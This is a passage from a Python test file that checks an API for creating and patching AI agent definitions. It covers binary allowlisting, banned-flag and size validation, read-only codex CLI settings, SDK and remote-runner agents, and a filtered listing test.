        json={"cli_binary_allowlist_id": "python3"},
    )
    assert patch_bad_bin.status_code == 422, patch_bad_bin.text
    assert patch_bad_bin.json()["code"] == "CLI_BINARY_NOT_ALLOWLISTED"

    # 4. Patch with instructions > 65536 bytes rejected
    patch_big_inst = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
        json={"system_instructions_md": "x" * 65537},
    )
    assert patch_big_inst.status_code == 422, patch_big_inst.text
    assert patch_big_inst.json()["code"] == "CLI_ARGS_INVALID"

    # 5. Patch cli_pipe with banned flag rejected
    patch_banned = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
        json={"cli_args": ["--yolo"]},
    )
    assert patch_banned.status_code == 422, patch_banned.text
    assert patch_banned.json()["code"] == "BANNED_CLI_FLAG"

    # 6. Patch cli_pipe fields cleanly
    patch_cli = await client.patch(
        f"/api/v1/agent-definitions/{agent_id}",
        json={
            "cli_binary_allowlist_id": "codex",
            "cli_args": ["exec", "-s", "read-only", "-"],
            "repo_access_mode": "ro_vfs_mount",
            "mcp_allowed_tools": ["read_ticket", "read_doc"],
            "system_instructions_md": "# Instructions\n\nBe helpful.",
            "timeout_ms": 150000,
        },
    )
    assert patch_cli.status_code == 200, patch_cli.text
    body_cli = patch_cli.json()
    assert body_cli["cli_binary_allowlist_id"] == "codex"
    assert body_cli["cli_args"] == ["exec", "-s", "read-only", "-"]
    assert body_cli["repo_access_mode"] == "ro_vfs_mount"
    assert body_cli["mcp_allowed_tools"] == ["read_ticket", "read_doc"]
    assert "Be helpful" in body_cli["system_instructions_md"]
    assert body_cli["timeout_ms"] == 150000

    # 7. Create and patch in_app_sdk agent
    sdk_resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "patch-sdk",
            "display_name": "Patch SDK",
            "harness_kind": "in_app_sdk",
            "provider_kind": "openai",
            "model_id": "gpt-4o",
        },
    )
    assert sdk_resp.status_code == 201, sdk_resp.text
    sdk_id = sdk_resp.json()["id"]

    patch_sdk = await client.patch(
        f"/api/v1/agent-definitions/{sdk_id}",
        json={"provider_kind": "gemini", "model_id": "gemini-2.5-flash"},
    )
    assert patch_sdk.status_code == 200, patch_sdk.text
    assert patch_sdk.json()["provider_kind"] == "gemini"
    assert patch_sdk.json()["model_id"] == "gemini-2.5-flash"

    # 8. Create and patch remote_runner agent
    remote_resp = await client.post(
        f"/api/v1/workspaces/{api_env.workspace_id}/agent-definitions",
        json={
            "slug": "patch-remote",
            "display_name": "Patch Remote",
            "harness_kind": "remote_runner",
            "remote_runner_pool_slug": "pool-init",
        },
    )
    assert remote_resp.status_code == 201, remote_resp.text
    remote_id = remote_resp.json()["id"]

    patch_remote = await client.patch(
        f"/api/v1/agent-definitions/{remote_id}",
        json={"remote_runner_pool_slug": "pool-updated"},
    )
    assert patch_remote.status_code == 200, patch_remote.text
    assert patch_remote.json()["remote_runner_pool_slug"] == "pool-updated"

    # 9. Surrogate character rejected in patch via schema model validation
    with pytest.raises(ProblemException) as exc_patch_surr:
        AgentDefinitionPatch(system_instructions_md="hello \ud800 world")
    assert exc_patch_surr.value.code == "CLI_ARGS_INVALID"


@pytest.mark.asyncio
async def test_agent_definition_service_coverage_branches(
    api_env: ApiEnv,
    make_user: Callable[..., Awaitable[SeededUser]],
) -> None:
    """Exercise verify_workspace current and list_all with project_id filter."""
    admin = await make_user("service-cov-admin", workspace_role="WORKSPACE_ADMIN")
    pctx = PrincipalContext(
        principal_id=admin.id,
        workspace_id=api_env.workspace_id,
        token_scopes=("workspace:read", "workspace:write"),
        aal_level=2,
    )
    await AgentDefinitionService.verify_workspace(api_env.seed, pctx, "current")
    target_proj_id = uuid.uuid4()
    res = await AgentDefinitionService.list_definitions(
        api_env.seed, pctx, "current", project_id=target_proj_id
    )
    assert res == []
